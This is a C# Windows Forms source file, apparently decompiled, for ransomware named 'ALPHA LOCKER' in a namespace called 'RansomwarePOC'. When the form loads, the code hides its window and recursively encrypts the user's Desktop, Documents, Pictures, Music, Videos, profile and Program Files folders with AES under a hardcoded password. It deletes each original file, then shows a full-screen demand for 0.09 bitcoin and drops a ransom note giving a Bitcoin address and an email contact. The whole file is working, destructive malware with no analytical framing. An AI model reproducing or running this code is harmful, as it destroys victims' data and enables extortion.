using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace RansomwarePOC;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const bool ENCRYPT_PROGRAMFILES86 = true;

	private const bool ENCRYPT_PROGRAMFILES = true;

	private const bool ENCRYPT_PROGRAMS = true;

	private const bool ENCRYPT_USR = true;

	private const bool ENCRYPT_MUSIC = true;

	private const bool ENCRYPT_VIDEOS = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".ALPHAlocker";

	private const string ENCRYPT_PASSWORD = "Salted__AmB>\u0017Bž\v–Ì\u00adÚ\u001e3\u001b’0î‘]E\u001aÝ@";

	private const string BITCOIN_ADDRESS = "bc1q4v9ngtqpdq6jfvmz7f72xd7cg97cd082vnmv63";

	private const string BITCOIN_RANSOM_AMOUNT = "0.09";

	private const string EMAIL_ADDRESS = "clay_whoami_1@protonmail.ch";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "All of your files have been encrypted.\n\nTo unlock them, please send 0.09 bitcoin(s) to BTC address: bc1q4v9ngtqpdq6jfvmz7f72xd7cg97cd082vnmv63\nAfterwards, please email your transaction ID to: clay_whoami_1@protonmail.ch\n\nThank you and have a nice day!\n\nEncryption Log:\n----------------------------------------\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private string PROGRAMFILES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

	private string PROGRAMFILES86_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);

	private string PROGRAMS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Programs);

	private string USR_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	private string MUSIC_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

	private string VIDEOS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);

	private static int encryptedFileCount = 0;

	private IContainer components;

	private Label lblCount;

	private Label lblBitcoinAmount;

	private Label label2;

	private TextBox txtEmailAddress;

	private Label label3;

	private PictureBox pictureBox1;

	private Label label5;

	protected internal TextBox txtBitcoinAddress;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		initializeForm();
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		encryptFolderContents(PROGRAMFILES_FOLDER);
		encryptFolderContents(PROGRAMFILES86_FOLDER);
		encryptFolderContents(PROGRAMS_FOLDER);
		encryptFolderContents(USR_FOLDER);
		encryptFolderContents(MUSIC_FOLDER);
		encryptFolderContents(VIDEOS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "??DECRYPT??.ALPHAlocker.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)lblCount).set_Text("Your files (count: " + encryptedFileCount + ") have been encrypted!");
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)lblBitcoinAmount).set_Text("Please send 0.09 Bitcoin(s) to the following BTC address:");
		((Control)txtBitcoinAddress).set_Text("bc1q4v9ngtqpdq6jfvmz7f72xd7cg97cd082vnmv63");
		((Control)txtEmailAddress).set_Text("clay_whoami_1@protonmail.ch");
		((Control)lblBitcoinAmount).Focus();
	}

	private static void encryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".ALPHAlocker"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, "Salted__AmB>\u0017Bž\v–Ì\u00adÚ\u001e3\u001b’0î‘]E\u001aÝ@");
				}
			}
			files = Directory.GetDirectories(sDir);
			for (int i = 0; i < files.Length; i++)
			{
				encryptFolderContents(files[i]);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".ALPHAlocker", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	private void label3_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_01db: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e5: Expected O, but got Unknown
		//IL_029b: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a5: Expected O, but got Unknown
		//IL_0362: Unknown result type (might be due to invalid IL or missing references)
		//IL_036c: Expected O, but got Unknown
		//IL_0411: Unknown result type (might be due to invalid IL or missing references)
		//IL_041b: Expected O, but got Unknown
		//IL_04c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d0: Expected O, but got Unknown
		//IL_0555: Unknown result type (might be due to invalid IL or missing references)
		//IL_055f: Expected O, but got Unknown
		//IL_06b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c2: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		lblCount = new Label();
		lblBitcoinAmount = new Label();
		label2 = new Label();
		txtBitcoinAddress = new TextBox();
		txtEmailAddress = new TextBox();
		label3 = new Label();
		pictureBox1 = new PictureBox();
		label5 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lblCount).set_Anchor((AnchorStyles)14);
		((Control)lblCount).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCount).set_ForeColor(Color.Red);
		((Control)lblCount).set_Location(new Point(12, 317));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(914, 55));
		((Control)lblCount).set_TabIndex(0);
		((Control)lblCount).set_Text("Your files (count: n) have been encrypted!");
		lblCount.set_TextAlign((ContentAlignment)32);
		((Control)lblBitcoinAmount).set_Anchor((AnchorStyles)14);
		((Control)lblBitcoinAmount).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblBitcoinAmount).set_ForeColor(Color.Lime);
		((Control)lblBitcoinAmount).set_Location(new Point(12, 459));
		((Control)lblBitcoinAmount).set_Name("lblBitcoinAmount");
		((Control)lblBitcoinAmount).set_Size(new Size(914, 55));
		((Control)lblBitcoinAmount).set_TabIndex(1);
		((Control)lblBitcoinAmount).set_Text("Please send n Bitcoin(s) to the following BTC address:");
		lblBitcoinAmount.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_Anchor((AnchorStyles)14);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Lime);
		((Control)label2).set_Location(new Point(12, 564));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(914, 55));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("Next, E-mail your transaction ID to the following address:");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)txtBitcoinAddress).set_Anchor((AnchorStyles)2);
		((Control)txtBitcoinAddress).set_BackColor(Color.Black);
		((Control)txtBitcoinAddress).set_Cursor(Cursors.get_WaitCursor());
		((Control)txtBitcoinAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtBitcoinAddress).set_ForeColor(Color.Red);
		((Control)txtBitcoinAddress).set_Location(new Point(124, 517));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		((Control)txtBitcoinAddress).set_Size(new Size(726, 44));
		((Control)txtBitcoinAddress).set_TabIndex(3);
		((Control)txtBitcoinAddress).set_Text("bc1q4v9ngtqpdq6jfvmz7f72xd7cg97cd082vnmv63");
		txtBitcoinAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)txtBitcoinAddress).set_UseWaitCursor(true);
		((Control)txtEmailAddress).set_Anchor((AnchorStyles)2);
		((Control)txtEmailAddress).set_BackColor(Color.Black);
		((Control)txtEmailAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtEmailAddress).set_ForeColor(Color.Red);
		((Control)txtEmailAddress).set_Location(new Point(136, 622));
		((Control)txtEmailAddress).set_Name("txtEmailAddress");
		((TextBoxBase)txtEmailAddress).set_ReadOnly(true);
		((Control)txtEmailAddress).set_Size(new Size(677, 44));
		((Control)txtEmailAddress).set_TabIndex(4);
		((Control)txtEmailAddress).set_Text("clay_whoami_1@protonmail.ch");
		txtEmailAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)label3).set_Anchor((AnchorStyles)14);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(12, 372));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(914, 87));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("In order to recover your data follow these steps:\r\n");
		label3.set_TextAlign((ContentAlignment)2);
		((Control)label3).add_Click((EventHandler)label3_Click);
		((Control)pictureBox1).set_Anchor((AnchorStyles)15);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(281, -5));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(402, 333));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(6);
		pictureBox1.set_TabStop(false);
		((Control)label5).set_Anchor((AnchorStyles)14);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Crimson);
		((Control)label5).set_Location(new Point(12, 669));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(914, 71));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text(".");
		label5.set_TextAlign((ContentAlignment)32);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(938, 749));
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)lblBitcoinAmount);
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_ForeColor(Color.Red);
		((Form)this).set_FormBorderStyle((FormBorderStyle)6);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("ALPHA LOCKER");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
